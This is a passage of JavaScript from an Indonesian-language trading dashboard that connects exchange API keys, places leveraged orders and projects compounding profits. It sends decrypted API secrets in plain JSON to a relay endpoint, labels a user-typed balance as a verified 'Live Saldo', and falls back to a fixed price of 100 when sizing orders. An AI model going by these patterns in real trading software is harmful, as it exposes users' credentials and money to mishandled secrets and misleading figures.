        adminLogEvent('EXCHANGE_VAULT_SEAL', `${ex.name} terenkripsi AES-256-GCM (KeyMask: ${vault.keyMask}, Saldo: $${balUsd.toLocaleString('en-US')})`);
        renderExchangeGatewayUI();
        recalcQuantProfitPlan();
        updateSecurityDashboardUI();
        return userExchangeConfigs[ex.id];
    }

    async function saveAndConnectExchange() {
        const ex = EXCHANGE_BY_ID[selectedExchangeId];
        if (!ex) return;
        const apiKey = document.getElementById('exApiKeyInput')?.value || '';
        const secret = document.getElementById('exApiSecretInput')?.value || '';
        const extra = document.getElementById('exExtraFieldInput')?.value || '';
        const balUsd = parseFloat(document.getElementById('exInitialBalInput')?.value || '1000');
        const autoTrade = (document.getElementById('exAutoTradeSel')?.value || 'ON') === 'ON';

        const cfg = await connectExchangeSecure(ex.id, apiKey, secret, balUsd, extra, autoTrade);
        if (!cfg) return;

        const telBox = document.getElementById('exSignatureTelemetryBox');
        if (telBox) {
            telBox.innerHTML = `<span style="color:var(--up);font-weight:700;">[VERIFIED] TERHUBUNG KE ${esc(ex.name.toUpperCase())}</span> · Vault: <b>AES-256-GCM (${esc(cfg.keyMask)})</b> · HMAC: <code>${esc(cfg.lastSig)}...</code> · Live Saldo: <b style="color:var(--gold);">$${cfg.balanceUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })}</b>`;
        }
        const syncEl = document.getElementById('exLastSyncTime');
        if (syncEl) syncEl.textContent = 'Sync: ' + new Date().toLocaleTimeString('id-ID');

        selectExchangeCard(ex.id);
        if (typeof showToast === 'function') showToast(`${ex.name} terenkripsi AES-256-GCM & terhubung! Live Saldo $${cfg.balanceUsd.toLocaleString('en-US')}.`, 'ok');
    }

    function disconnectSelectedExchange() {
        const ex = EXCHANGE_BY_ID[selectedExchangeId];
        if (!ex) return;
        const userScope = currentUser && currentUser.email ? currentUser.email.toLowerCase() : 'guest';
        privateMemoryVault.delete(userScope + '::' + ex.id);
        delete userExchangeConfigs[ex.id];
        saveCurrentUserWorkstate();
        selectExchangeCard(ex.id);
        renderExchangeGatewayUI();
        recalcQuantProfitPlan();
        if (typeof showToast === 'function') showToast(`Koneksi API & Vault ${ex.name} dihapus.`, 'info');
    }

    function renderExchangeCardsGrid() {
        const grid = document.getElementById('exCardsGrid');
        if (!grid) return;
        const rate = (typeof window.exchangeRate === 'number' && window.exchangeRate > 0) ? window.exchangeRate : 16000;
        const list = EXCHANGE_CATALOG.filter(ex => currentExchangeFilter === 'ALL' || ex.category === currentExchangeFilter);
        grid.innerHTML = list.map(ex => {
            const cfg = userExchangeConfigs[ex.id];
            const isConn = Boolean(cfg && cfg.connected);
            const isSel = ex.id === selectedExchangeId;
            const balUsd = isConn ? (parseFloat(cfg.balanceUsd) || 0) : 0;
            const balStr = isConn
                ? (ex.currency === 'IDR' ? 'Rp' + Math.round(balUsd * rate).toLocaleString('id-ID') : '$' + balUsd.toLocaleString('en-US', { maximumFractionDigits: 0 }))
                : 'Klik untuk Hubungkan';
            return `<div class="ex-card ${isSel ? 'selected' : ''} ${isConn ? 'connected' : ''}" onclick="selectExchangeCard('${ex.id}')">
                <div class="ex-card-top">
                    <span class="ex-name">${esc(ex.name)}</span>
                    <span class="ex-dot ${isConn ? 'online' : ''}" title="${isConn ? 'Terhubung & Terenkripsi AES-256' : 'Belum Terhubung'}"></span>
                </div>
                <span class="ex-cat-lbl">${esc(ex.catLabel)}</span>
                <span class="ex-bal-lbl" style="color:${isConn ? 'var(--up)' : 'var(--text-muted)'};">${balStr}</span>
                <div style="display:flex;justify-content:space-between;align-items:center;margin-top:2px;">
                    <span class="qb-tag ${isConn ? 'up' : 'neutral'}">${isConn ? (cfg.autoTrade ? 'AES-256 AUTO' : 'AES-256 OK') : 'OFFLINE'}</span>
                    <span style="font-size:0.48rem;color:var(--text-muted);">${esc(ex.currency)}</span>
                </div>
            </div>`;
        }).join('');
    }

    function renderExchangeGatewayUI() {
        const rate = (typeof window.exchangeRate === 'number' && window.exchangeRate > 0) ? window.exchangeRate : 16000;
        let totUsd = 0, cryptoIdUsd = 0, cryptoIntlUsd = 0, forexIdUsd = 0, ibkrUsd = 0, connCount = 0;

        EXCHANGE_CATALOG.forEach(ex => {
            const cfg = userExchangeConfigs[ex.id];
            if (cfg && cfg.connected) {
                const b = parseFloat(cfg.balanceUsd) || 0;
                totUsd += b;
                connCount++;
                if (ex.category === 'CRYPTO_ID') cryptoIdUsd += b;
                else if (ex.category === 'CRYPTO_INTL') cryptoIntlUsd += b;
                else if (ex.category === 'FOREX_ID') forexIdUsd += b;
                else if (ex.category === 'STOCK_FOREX_INTL') ibkrUsd += b;
            }
        });

        const fmtU = v => '$' + v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        const setTxt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
        setTxt('exTotalEquityUsd', fmtU(totUsd));
        setTxt('exTotalEquityIdr', `Rp${Math.round(totUsd * rate).toLocaleString('id-ID')} · ${connCount} dari 16 bursa aktif`);
        setTxt('exCryptoIdBal', fmtU(cryptoIdUsd));
        setTxt('exCryptoIdSub', `Rp${Math.round(cryptoIdUsd * rate).toLocaleString('id-ID')} (Indodax & Tokocrypto)`);
        setTxt('exCryptoIntlBal', fmtU(cryptoIntlUsd));
        setTxt('exForexIdBal', fmtU(forexIdUsd));
        setTxt('exIbkrBal', fmtU(ibkrUsd));
        setTxt('pfStripConnectedCount', `${connCount} / 16`);
        setTxt('pfStripTotalExchangeBal', fmtU(totUsd));

        renderExchangeCardsGrid();
        renderLiveExchangePositions();
    }

    function getLivePriceForSymbol(sym) {
        const clean = String(sym || 'BTCUSDT').replace('USDT', '').replace('/USD', '').toUpperCase();
        if (typeof window.cryptoCache !== 'undefined' && Array.isArray(window.cryptoCache)) {
            const c = window.cryptoCache.find(x => x.symbol && x.symbol.toUpperCase() === clean);
            if (c && c.current_price > 0) return c.current_price;
        }
        if (typeof window.stocksCache !== 'undefined' && Array.isArray(window.stocksCache)) {
            const s = window.stocksCache.find(x => x.sym && x.sym.toUpperCase() === clean);
            if (s && s.price > 0) return s.price;
        }
        if (typeof window.forexCache !== 'undefined' && Array.isArray(window.forexCache)) {
            const f = window.forexCache.find(x => x.sym && x.sym.toUpperCase().includes(clean));
            if (f && f.price > 0) return f.price;
        }
        // Fallback to latest closed signal entry price from real Binance/Yahoo fetch if cache is still loading
        if (brain && Array.isArray(brain.signals) && brain.signals.length) {
            const m = brain.signals.find(s => s.sym && s.sym.toUpperCase().includes(clean));
            if (m && m.entry > 0) return m.entry;
        }
        return 100;
    }

    async function executeSignalOnExchange(exId, sigObj, customNonce, customTs) {
        const ex = EXCHANGE_BY_ID[exId];
        const cfg = userExchangeConfigs[exId];
        if (!ex || !cfg || !cfg.connected) {
            if (typeof showToast === 'function') showToast(`Hubungkan API ${ex ? ex.name : exId} terlebih dahulu!`, 'err');
            return null;
        }

        const ts = customTs != null ? customTs : Date.now();
        const nonce = customNonce != null ? customNonce : generateOrderNonce();
        if (!verifyAndConsumeNonce(nonce, ts)) {
            return null;
        }

        const cred = getDecryptedVaultCredential(ex.id) || { apiKey: 'VAULT_KEY', secret: 'VAULT_SEC' };
        let sym = sigObj ? sigObj.sym : (ex.assetClass === 'FOREX' ? 'EURUSDT' : ex.assetClass === 'STOCK' ? 'NVDA' : 'BTCUSDT');
        const entry = sigObj && sigObj.entry ? sigObj.entry : getLivePriceForSymbol(sym);
        const side = sigObj && sigObj.side ? sigObj.side : 'LONG';
        const atrPct = sigObj && sigObj.volPct ? (sigObj.volPct / 100) : 0.0125;
        const atrMult = brain.learned.atrMult || 1.8;
        const slDistPct = Math.max(0.003, atrPct * atrMult);

        const riskPct = (brain.params.riskPct || 1.0) / 100;
        const modalUsd = Math.max(10, parseFloat(cfg.balanceUsd) || 1000);
        const riskUsd = modalUsd * riskPct;
        const lev = sigObj && sigObj.lev ? sigObj.lev : leverageFor(atrPct * 100);
        const notionalUsd = riskUsd / slDistPct;
        const marginUsd = Math.min(modalUsd * 0.35, Math.max(10, notionalUsd / lev));
        const marginPctOfModal = (marginUsd / modalUsd) * 100;

        const sl = side === 'LONG' ? entry * (1 - slDistPct) : entry * (1 + slDistPct);
        const riskPerUnit = Math.abs(entry - sl);
        const tp1Ratio = brain.learned.tp1Ratio || 0.8;
        const tp1 = side === 'LONG' ? entry + tp1Ratio * riskPerUnit : entry - tp1Ratio * riskPerUnit;
        const tp2 = side === 'LONG' ? entry + 1.6 * riskPerUnit : entry - 1.6 * riskPerUnit;
        const tp3 = side === 'LONG' ? entry + 2.5 * riskPerUnit : entry - 2.5 * riskPerUnit;

        const orderPayload = `symbol=${sym}&side=${side}&type=MARKET&marginUsd=${marginUsd.toFixed(2)}&leverage=${lev}&sl=${sl.toFixed(4)}&tp3=${tp3.toFixed(4)}&nonce=${nonce}&ts=${ts}`;
        const sigHash = await computeHmacSignature(cred.secret, orderPayload, ex.authType);

        // Non-blocking Fast-Path Execution Router (0ms dead wait if relay is offline; instant keep-alive dispatch if online)
        const execT0 = (typeof performance !== "undefined" && performance.now) ? performance.now() : Date.now();
        const maxSlippageBps = (sym === "BTCUSDT" || sym === "ETHUSDT" || ex.assetClass === "FOREX") ? 12 : 20;
        const vpinExec = (marginUsd * lev >= 5000) ? "TWAP_3X_MICRO_SLICE" : "ATOMIC_KEEPALIVE_MARKET";
        let relayOrderId = null;
        let relayMode = "OMS_ZERO_LAG_TRACKER";

        if (autoLocalOnline) {
            try {
                const relayOrdRes = await fetch(getActiveRelayUrl() + "/api/v1/order", {
                    method: "POST",
                    keepalive: true,
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        exId: ex.id,
                        apiKey: cred.apiKey,
                        secret: cred.secret,
                        extra: cred.extra,
                        sym, side, lev,
                        marginUsd: Math.round(marginUsd * 100) / 100,
                        notionalUsd: Math.round(marginUsd * lev * 100) / 100,
                        entry, sl, tp1, tp3, maxSlippageBps, nonce, ts
                    }),
                    signal: AbortSignal.timeout ? AbortSignal.timeout(2500) : undefined
                }).catch(() => null);
                if (relayOrdRes && relayOrdRes.ok) {
                    const rj = await relayOrdRes.json().catch(() => null);
                    if (rj && rj.ok) {
                        relayOrderId = rj.exchangeOrderId;
                        relayMode = rj.executionMode || "REAL_EXCHANGE_API";
                    }
                }
            } catch (e) {}
            if (autoLocalModePref === "AUTO_OPEN_LOCAL" && typeof location !== "undefined" && location.hostname !== "127.0.0.1" && location.hostname !== "localhost") {
                syncStateWithLocalRelay(true).catch(() => false);
                if (typeof window.open === "function") window.open(getActiveRelayUrl() + "/?autoexec=" + ex.id + "&sym=" + sym, "_blank");
            }
        } else {
            if (typeof probeAutoLocalEngine === "function") probeAutoLocalEngine().catch(() => false);
        }

        const execElapsedMs = Math.max(0.05, +(((typeof performance !== "undefined" && performance.now) ? performance.now() : Date.now()) - execT0).toFixed(2));
        const vpinEl = document.getElementById("autoLocalVpinTelemetry");
        if (vpinEl) {
            vpinEl.textContent = "Exec Latency: " + execElapsedMs + " ms (HMAC " + lastSignLatencyMs + " ms) · Slippage Cap: " + maxSlippageBps + " bps · Mode: " + vpinExec + " · Target: " + ex.name;
        }
        if (hybridBroadcastBus) {
            try { hybridBroadcastBus.postMessage({ type: "HYBRID_STATE_UPDATED", ts }); } catch (e) {}
        }

        const pos = {
            exchangeOrderId: relayOrderId || ("ORD_" + ts),
            execMode: relayMode,
            id: 'EXORD_' + ts + '_' + nonce.slice(-6),
            nonce: nonce.slice(0, 12),
            exId: ex.id,
            exName: ex.name,
            sym,
            side,
            lev,
            marginUsd: Math.round(marginUsd * 100) / 100,
            marginPct: Math.round(marginPctOfModal * 10) / 10,
            notionalUsd: Math.round(marginUsd * lev * 100) / 100,
            riskUsd: Math.round(riskUsd * 100) / 100,
            entry,
            mark: entry,
            sl,
            tp1,
            tp2,
            tp3,
            beActive: false,
            sigHash: sigHash.slice(0, 16),
            strategy: (brain.champion && brain.champion.name) || '7-Screen Confluence',
            status: 'LIVE_OPEN',
            openedAt: ts
        };

        liveExchangePositions.unshift(pos);
        if (liveExchangePositions.length > 60) liveExchangePositions.length = 60;
        saveCurrentUserWorkstate();
        renderExchangeGatewayUI();

        qbJournal('SIGNAL', `[LIVE EXEC ${ex.name}] ${side} ${sym} ${lev}x | Margin $${pos.marginUsd} (${pos.marginPct}% modal) | Entry ${fmtPx(entry)} · SL ${fmtPx(sl)} · TP3 ${fmtPx(tp3)} | Nonce ${pos.nonce}`);
        adminLogEvent('API_EXECUTION', `${ex.name}: ${side} ${sym} ($${pos.notionalUsd} notional, Nonce ${pos.nonce}, Sig ${pos.sigHash})`);
        return pos;
    }

    function autoExecuteSignalAcrossConnectedExchanges(sigObj) {
        const connected = getConnectedExchangesList().filter(ex => userExchangeConfigs[ex.id].autoTrade !== false);
        connected.forEach(ex => {
            executeSignalOnExchange(ex.id, sigObj);
        });
    }

    async function closeLiveExchangePosition(posId) {
        const idx = liveExchangePositions.findIndex(p => p.id === posId);
        if (idx === -1) return;
        const p = liveExchangePositions[idx];
        const mark = getLivePriceForSymbol(p.sym);
        const pctMove = p.entry > 0 ? ((p.side === 'LONG' ? (mark - p.entry) : (p.entry - mark)) / p.entry) : 0;
        const pnlUsd = p.notionalUsd * pctMove;
        const rMult = p.riskUsd > 0 ? (pnlUsd / p.riskUsd) : (pctMove * p.lev);

        if (userExchangeConfigs[p.exId]) {
            userExchangeConfigs[p.exId].balanceUsd = Math.max(0, Math.round((userExchangeConfigs[p.exId].balanceUsd + pnlUsd) * 100) / 100);
        }
        brain.equityR = Math.round((brain.equityR + rMult) * 100) / 100;
        brain.stats.closed++;
        if (rMult >= 0) brain.stats.wins++;
        else {
            brain.stats.losses++;
            qbPostMortem({ sym: p.sym, side: p.side, netR: rMult, closeReason: 'Manual/SL Close on ' + p.exName, mfe: Math.max(0, rMult) });
        }
        liveExchangePositions.splice(idx, 1);
        saveCurrentUserWorkstate();
        saveBrain();
        renderExchangeGatewayUI();
        qbRenderAll();
        recalcQuantProfitPlan();
        if (typeof showToast === 'function') {
            showToast(`Posisi ${p.sym} di ${p.exName} ditutup · Realized P/L: ${pnlUsd >= 0 ? '+' : ''}$${pnlUsd.toFixed(2)} (${rMult >= 0 ? '+' : ''}${rMult.toFixed(2)}R)`, pnlUsd >= 0 ? 'ok' : 'info');
        }
    }

    function renderLiveExchangePositions() {
        const tbody = document.getElementById('exLivePositionsBody');
        if (!tbody) return;
        if (!liveExchangePositions.length) {
            tbody.innerHTML = `<tr><td colspan="11" style="text-align:center;padding:1.1rem;color:var(--text-muted);">Belum ada posisi eksekusi langsung. Hubungkan bursa di atas lalu klik <b>"EKSEKUSI SINYAL QUANT SEKARANG"</b> atau aktifkan <b>AUTO-EXEC BURSA</b>.</td></tr>`;
            return;
        }
        tbody.innerHTML = liveExchangePositions.map(p => {
            const mark = getLivePriceForSymbol(p.sym);
            p.mark = mark;
            const pctMove = p.entry > 0 ? ((p.side === 'LONG' ? (mark - p.entry) : (p.entry - mark)) / p.entry) : 0;
            const pnlUsd = p.notionalUsd * pctMove;
            const rMult = p.riskUsd > 0 ? (pnlUsd / p.riskUsd) : 0;
            if (!p.beActive && ((p.side === 'LONG' && mark >= p.tp1) || (p.side === 'SHORT' && mark <= p.tp1))) {
                p.beActive = true;
                p.sl = p.entry;
            }
            const col = pnlUsd >= 0 ? 'var(--up)' : 'var(--down)';
            const sign = pnlUsd >= 0 ? '+' : '';
            const tStr = new Date(p.openedAt).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            return `<tr>
                <td><span style="color:var(--text-muted);">${tStr}</span><span class="td-sub">Nonce: ${esc(p.nonce || p.sigHash)}</span></td>
                <td><strong style="color:var(--gold);">${esc(p.exName)}</strong></td>
                <td class="td-name">${esc(p.sym)}</td>
                <td><span class="qb-tag ${p.side === 'LONG' ? 'up' : 'down'}">${p.side} ${p.lev}x</span></td>
                <td class="num">$${p.marginUsd.toLocaleString('en-US')} <span class="td-sub">${p.marginPct}% modal</span></td>
                <td class="num">${fmtPx(p.entry)}</td>
                <td class="num td-sym">${fmtPx(mark)}</td>
                <td class="num" style="color:var(--down);">${fmtPx(p.sl)} ${p.beActive ? '<span class="qb-tag warn">BE</span>' : ''}</td>
                <td class="num" style="color:var(--up);">${fmtPx(p.tp1)} / ${fmtPx(p.tp3)}</td>
                <td class="num" style="color:${col};font-weight:700;">${sign}$${pnlUsd.toFixed(2)} (${sign}${rMult.toFixed(2)}R)</td>
                <td><button type="button" class="btn-refresh" style="color:var(--gold);border-color:var(--gold);" onclick="closeLiveExchangePosition('${esc(p.id)}')">Tutup / TP</button></td>
            </tr>`;
        }).join('');
    }

    /* ═══════════════════════════════════════════════════════════════════════════
       13. QUANT PROFIT PLAN, COMPOUNDING TARGET & CAPITAL SIZING ENGINE (01F)
    ═══════════════════════════════════════════════════════════════════════════ */
    function computeProfitPlanData(opts) {
        opts = opts || {};
        const capitalUsd = Math.max(10, parseFloat(opts.capitalUsd) || 1000);
        const riskPct = Math.max(0.25, Math.min(2.5, parseFloat(opts.riskPct) || 1.0));
        const atrPct = Math.max(0.15, parseFloat(opts.atrPct) || 1.25);
        const tradesPerWeek = Math.max(1, parseInt(opts.tradesPerWeek, 10) || 5);
        const compoundMode = opts.compoundMode || 'MODERATE';
        const marketClass = opts.marketClass || 'MULTI';

        const champ = recomputeChampionStrategy();
        // Proyeksi HANYA memakai ekspektansi yang terukur: out-of-sample, net fee+slippage, dan lolos koreksi
        // multiple-testing. Tanpa itu ekspektansi = 0 (tidak ada lantai win rate / ekspektansi buatan).
        const verified = !!champ.significant;
        const winRate = Math.max(0, Math.min(100, champ.winRate || 0)) / 100;
        const avgWinR = 1.65;
        const avgLossR = 0.82;
        const expR = verified ? Math.max(0, champ.expPerTrade || 0) : 0;

        const atrMult = brain.learned.atrMult || 1.8;
        const slDistancePct = atrPct * atrMult;
        const maxLossUsd = capitalUsd * (riskPct / 100);
        const requiredNotionalUsd = maxLossUsd / (slDistancePct / 100);

        let recLeverage = Math.max(1, Math.min(20, Math.floor(25 / slDistancePct)));
        if (marketClass === 'STOCK') recLeverage = Math.min(2, recLeverage);
        else if (marketClass === 'FOREX') recLeverage = Math.max(10, Math.min(50, recLeverage * 4));
        else recLeverage = Math.max(2, Math.min(10, recLeverage));

        const marginUsd = Math.min(capitalUsd * 0.40, requiredNotionalUsd / recLeverage);
        const entryPctOfModal = (marginUsd / capitalUsd) * 100;

        const tp1Pct = slDistancePct * (brain.learned.tp1Ratio || 0.8);
        const tp2Pct = slDistancePct * 1.6;
        const tp3Pct = slDistancePct * 2.5;

        const payoffRatio = avgWinR / avgLossR;
        const fullKelly = winRate - ((1 - winRate) / payoffRatio);
        const halfKellyPct = verified ? Math.max(0, Math.min(25, fullKelly * 0.5 * 100)) : 0;
        const expectedReturnPerTradePct = riskPct * expR;

        const horizons = [
            { id: 'W1', label: 'Minggu Pertama (Week 1)', weeks: 1, days: 7 },
            { id: 'W2', label: 'Minggu ke-2 (Week 2)', weeks: 2, days: 14 },
            { id: 'M1', label: 'Bulan Pertama (Month 1)', weeks: 4.33, days: 30 },
            { id: 'M2', label: 'Bulan ke-2 (Month 2)', weeks: 8.66, days: 60 },
            { id: 'Q1', label: 'Bulan ke-3 / Kuartal 1 (Q1)', weeks: 13, days: 90 },
            { id: 'M6', label: 'Bulan ke-6 / Semester 1', weeks: 26, days: 180 },
            { id: 'Y1', label: 'Tahun Pertama (Year 1)', weeks: 52, days: 365 },
            { id: 'Y2', label: 'Tahun ke-2 (Year 2)', weeks: 104, days: 730 },
            { id: 'Y3', label: 'Tahun ke-3+ (Year 3 Institutional)', weeks: 156, days: 1095 }
        ];

        const realizedR = Math.max(0, brain.equityR || 0);
        const rows = horizons.map(h => {
            const totalTrades = Math.round(h.weeks * tradesPerWeek);
            const effRPerTrade = expR * 0.85;
            const stepRate = (riskPct / 100) * effRPerTrade;

            let champEndCap = capitalUsd;
            let consEndCap = capitalUsd;
            if (compoundMode === 'FIXED') {
                champEndCap = capitalUsd * (1 + totalTrades * stepRate);
                consEndCap = capitalUsd * (1 + totalTrades * stepRate * 0.6);
            } else if (compoundMode === 'MODERATE') {
                const comp = capitalUsd * Math.pow(1 + stepRate * 0.65, totalTrades);
                const lin = capitalUsd * (1 + totalTrades * stepRate);
                champEndCap = (comp + lin) * 0.5;
                consEndCap = capitalUsd * Math.pow(1 + stepRate * 0.42, totalTrades);
            } else {
                champEndCap = capitalUsd * Math.pow(1 + stepRate * 0.8, totalTrades);
                consEndCap = capitalUsd * Math.pow(1 + stepRate * 0.5, totalTrades);
            }

            const champProfitUsd = champEndCap - capitalUsd;
            const champProfitPct = (champProfitUsd / capitalUsd) * 100;
            const consProfitUsd = consEndCap - capitalUsd;
            const consProfitPct = (consProfitUsd / capitalUsd) * 100;
            const maxAllowedDdPct = Math.min(12, Math.max(3, riskPct * 5));

            const targetRNeeded = totalTrades * effRPerTrade;
            const progressPct = targetRNeeded > 0 ? Math.min(100, Math.round((realizedR / targetRNeeded) * 100)) : 0;

            return {
                id: h.id,
                label: h.label,
                days: h.days,
                startCapUsd: capitalUsd,
                trades: totalTrades,
                consProfitPct,
                consProfitUsd,
                champProfitPct,
                champProfitUsd,
                endCapUsd: champEndCap,
                maxDdPct: maxAllowedDdPct,
                targetR: targetRNeeded,
                progressPct
            };
        });

        return {
            capitalUsd,
            riskPct,
            maxLossUsd,
            entryPctOfModal,
            marginUsd,
            notionalUsd: marginUsd * recLeverage,
            recLeverage,
            slDistancePct,
            tp1Pct,
            tp2Pct,
            tp3Pct,
            winRatePct: winRate * 100,
            expR,
            expectedReturnPerTradePct,
            halfKellyPct,
            champ,
            verified,
            rows
        };
    }

    function recalcQuantProfitPlan() {
        const src = document.getElementById('ppCapitalSourceSel')?.value || 'CUSTOM';
        const capInp = document.getElementById('ppInitialCapitalUsd');
        if (src !== 'CUSTOM' && capInp) {
            const liveBal = getTotalConnectedBalanceUsd(src);
            if (liveBal > 0) capInp.value = Math.round(liveBal);
        }
        const capitalUsd = Math.max(10, parseFloat(capInp?.value) || 1000);
        const rate = (typeof window.exchangeRate === 'number' && window.exchangeRate > 0) ? window.exchangeRate : 16000;
        const idrHint = document.getElementById('ppCapitalIdrHint');
        if (idrHint) idrHint.textContent = `Setara Rp${Math.round(capitalUsd * rate).toLocaleString('id-ID')}`;

        const riskPct = parseFloat(document.getElementById('ppRiskPerTradeSel')?.value || '1.0');
        const atrPct = parseFloat(document.getElementById('ppAssetAtrPct')?.value || '1.25');
        const tradesPerWeek = parseInt(document.getElementById('ppTradesPerWeek')?.value || '5', 10);
        const compoundMode = document.getElementById('ppCompoundModeSel')?.value || 'MODERATE';
        const marketClass = document.getElementById('ppMarketClassSel')?.value || 'MULTI';

        const plan = computeProfitPlanData({ capitalUsd, riskPct, atrPct, tradesPerWeek, compoundMode, marketClass });

        const badge = document.getElementById('ppActiveStratBadge');
        if (badge && plan.champ) {
            badge.textContent = plan.verified
                ? `CHAMPION: ${plan.champ.name.toUpperCase()} (${plan.champ.winRate}% WIN, ${plan.champ.trades} TRADE OOS)`
                : `BELUM TERVERIFIKASI: ${qbChampionLabel(plan.champ).toUpperCase()} (PROYEKSI = 0)`;
        }

        const bpGrid = document.getElementById('ppBlueprintGrid');
        if (bpGrid) {
            bpGrid.innerHTML = `
                <div class="pp-bp-cell">
                    <small>ENTRY ALLOCATION / TRADE</small>
                    <strong style="color:var(--gold);">${plan.entryPctOfModal.toFixed(1)}% Modal</strong>
                    <span>Margin: $${plan.marginUsd.toFixed(2)} (Rp${Math.round(plan.marginUsd * rate).toLocaleString('id-ID')})</span>
                </div>
                <div class="pp-bp-cell">
                    <small>OPTIMAL SAFE LEVERAGE</small>
                    <strong style="color:var(--accent-teal);">${plan.recLeverage}x Leverage</strong>
                    <span>Notional: $${plan.notionalUsd.toFixed(0)} · Anti-Liq Guard</span>
                </div>
                <div class="pp-bp-cell">
                    <small>STOP LOSS (ATR ADAPTIVE)</small>
                    <strong style="color:var(--down);">-${plan.slDistancePct.toFixed(2)}% Jarak</strong>
                    <span>Max Rugi: -$${plan.maxLossUsd.toFixed(2)} (-${plan.riskPct}% Modal)</span>
                </div>
                <div class="pp-bp-cell">
                    <small>MULTI-STAGE TAKE PROFIT</small>
                    <strong style="color:var(--up);">+${plan.tp1Pct.toFixed(2)}% / +${plan.tp3Pct.toFixed(2)}%</strong>
                    <span>TP1 (0.8R BE) · TP2 (1.6R) · TP3 (2.5R)</span>
                </div>
                <div class="pp-bp-cell">
                    <small>EXPECTANCY PER TRADE</small>
                    <strong style="color:${plan.verified ? 'var(--up)' : 'var(--text-muted)'};">${plan.expR >= 0 ? '+' : ''}${plan.expR.toFixed(2)}R (${plan.expectedReturnPerTradePct >= 0 ? '+' : ''}${plan.expectedReturnPerTradePct.toFixed(2)}%)</strong>
                    <span>${plan.verified ? 'Terukur OOS net biaya, estimasi $' + (capitalUsd * plan.expectedReturnPerTradePct / 100).toFixed(2) + ' / trade' : 'Belum ada edge yang signifikan secara statistik'}</span>
                </div>
                <div class="pp-bp-cell">
                    <small>OOS VERIFIED WIN RATE</small>
                    <strong>${plan.winRatePct.toFixed(1)}%</strong>
                    <span>Min. Breakeven WR: 28.6%</span>
                </div>
                <div class="pp-bp-cell">
                    <small>HALF-KELLY FRACTION</small>
                    <strong style="color:var(--gold);">${plan.halfKellyPct.toFixed(1)}%</strong>
                    <span>Thorp Zero-Ruin Formula</span>
                </div>
                <div class="pp-bp-cell">
                    <small>CIRCUIT BREAKER CAP</small>
                    <strong style="color:var(--accent-orange);">Max 3x Loss / Hari</strong>
                    <span>Otomatis potong risk 30% saat DD</span>
                </div>
            `;
        }

        const tbody = document.getElementById('ppHorizonTableBody');
        if (tbody) {
            tbody.innerHTML = plan.rows.map(r => {
                const isKey = r.id === 'W1' || r.id === 'M1' || r.id === 'Y1';
                const rowStyle = isKey ? 'background:rgba(229,169,60,0.06);' : '';
                return `<tr style="${rowStyle}">
                    <td><strong style="color:${isKey ? 'var(--gold)' : 'var(--text-bright)'};">${esc(r.label)}</strong><span class="td-sub">${r.days} Hari Kalender</span></td>
                    <td class="num">$${r.startCapUsd.toLocaleString('en-US', { maximumFractionDigits: 0 })}</td>
                    <td class="num">${r.trades}x</td>
                    <td class="num" style="color:var(--accent-teal);">+${r.consProfitPct.toFixed(1)}% <span class="td-sub">+$${r.consProfitUsd.toLocaleString('en-US', { maximumFractionDigits: 0 })}</span></td>
                    <td class="num" style="color:var(--up);font-weight:700;">+${r.champProfitPct.toFixed(1)}%</td>
                    <td class="num" style="color:var(--gold);font-weight:700;">+$${r.champProfitUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}<span class="td-sub">+Rp${Math.round(r.champProfitUsd * rate).toLocaleString('id-ID')}</span></td>
                    <td class="num" style="color:var(--text-bright);font-weight:700;">$${r.endCapUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}<span class="td-sub">Rp${Math.round(r.endCapUsd * rate).toLocaleString('id-ID')}</span></td>
                    <td class="num" style="color:var(--down);">-${r.maxDdPct.toFixed(1)}%</td>
                    <td>
                        <div style="display:flex;justify-content:space-between;font-size:0.54rem;">
                            <span class="qb-tag ${r.progressPct >= 50 ? 'up' : 'teal'}">TARGET +${r.targetR.toFixed(1)}R</span>
                            <span>${r.progressPct}% Realized</span>
                        </div>
                        <div class="pp-proof-bar"><div class="pp-proof-fill" style="width:${r.progressPct}%;"></div></div>
                    </td>
                </tr>`;
            }).join('');
        }

        drawProfitPlanCanvas(plan);
        return plan;
    }

    function drawProfitPlanCanvas(plan) {
        const cv = document.getElementById('ppCompoundingCanvas');
        if (!cv || !plan || !plan.rows.length) return;
        const dpr = window.devicePixelRatio || 1;
        const w = Math.max(240, cv.clientWidth || 400);
        const h = Math.max(100, cv.clientHeight || 130);
        cv.width = w * dpr;
        cv.height = h * dpr;
        const ctx = cv.getContext('2d');
        ctx.scale(dpr, dpr);
        ctx.clearRect(0, 0, w, h);

        const ptsChamp = [plan.capitalUsd, ...plan.rows.map(r => r.endCapUsd)];
        const ptsCons = [plan.capitalUsd, ...plan.rows.map(r => plan.capitalUsd + r.consProfitUsd)];
        const minV = plan.capitalUsd * 0.95;
        const maxV = Math.max(...ptsChamp, plan.capitalUsd * 1.2);
        const padL = 12, padR = 54, padT = 12, padB = 18;
        const cw = w - padL - padR, ch = h - padT - padB;

        const xOf = i => padL + (i / (ptsChamp.length - 1)) * cw;
        const yOf = v => padT + ch - ((v - minV) / (maxV - minV || 1)) * ch;

        ctx.strokeStyle = 'rgba(255,255,255,0.06)';
        for (let g = 0; g <= 3; g++) {
            const gy = padT + (g / 3) * ch;
            ctx.beginPath(); ctx.moveTo(padL, gy); ctx.lineTo(w - padR, gy); ctx.stroke();
        }

        ctx.beginPath();
        ptsCons.forEach((v, i) => i === 0 ? ctx.moveTo(xOf(i), yOf(v)) : ctx.lineTo(xOf(i), yOf(v)));
        ctx.strokeStyle = '#06B6D4';
        ctx.lineWidth = 1.5;
        ctx.setLineDash([4, 3]);
        ctx.stroke();
        ctx.setLineDash([]);

        ctx.beginPath();
        ptsChamp.forEach((v, i) => i === 0 ? ctx.moveTo(xOf(i), yOf(v)) : ctx.lineTo(xOf(i), yOf(v)));
        ctx.strokeStyle = '#E5A93C';
        ctx.lineWidth = 2.2;
        ctx.stroke();

        ctx.fillStyle = '#94A3B8';
        ctx.font = '9px JetBrains Mono, monospace';
        const labels = ['Start', 'W1', 'W2', 'M1', 'M2', 'Q1', 'M6', 'Y1', 'Y2', 'Y3'];
        labels.forEach((lb, i) => {
